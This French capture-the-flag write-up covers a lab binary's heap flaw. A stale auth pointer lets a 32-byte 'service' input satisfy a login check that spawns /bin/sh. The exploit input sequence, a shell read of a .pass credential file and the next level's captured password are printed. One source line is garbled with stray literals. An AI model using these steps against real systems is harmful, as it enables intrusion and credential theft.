# Level 8

Voici le code source de ce niveau:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *auth = NULL;
char *service = NULL;

int main(void)
{
    char buf[132];

    while (1)
    {
        printf("%p, %p \n", auth, service);

        if (fgets(buf, 132, stdin) == NULL)
            return 0;

        /* Commande: "auth " */
        if (strncmp(buf, "auth ", 5) == 0)
        {
            auth = malloc(4);
            memset(auth, 0, 4);

            if (strlen(buf + 5) < 30)   // donc <= 30 octets
                strcpy(auth, buf + 5);
        }

        /* Commande: "reset" */
        if (strncmp(buf, "reset", 5) == 0)
        {
            free(auth);
            // auth n'est PAS remis à NULL
        }

        /* Commande: "service" */
        if (strncmp(buf, "service", 7) == 0)
        {
            service = strdup(buf + 7);               "service "         " "
            // l'ancien service n'est pas free => fuite mémoire
        }

        /* Commande: "login" */
        if (strncmp(buf, "login", 5) == 0)
        {
            if (*(int *)(auth + 32) == NULL)
            {
                fwrite("Password:\n", 1, 10, stdout);
            }
            else
            {
                system("/bin/sh");
            }
        }
    }
}
```

Ici le code est volontairement complexe pour nous perdre et c'est probablement la ou se trouve la plus grosse difficulte. Apres avoir factorise le code on se rend compte qu'en rentrant certains mots cle dans le fgets nous pouvons rentrer dans les differentes condition du code. Notre but est d'avoir une valeur non null a l'adresse auth + 32 pour avoir acces a un shell qui peut nous cat le .pass. Il suffit donc d'entrer `auth ` pour s'assurer que auth est allouer et ensuite de remplir service avec 32 octets.

Voici donc la commande que nous pouvons utiliser:

```bash
./level8
auth 
service qwertyuiopasdfgqwertyuiopqwert
login
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
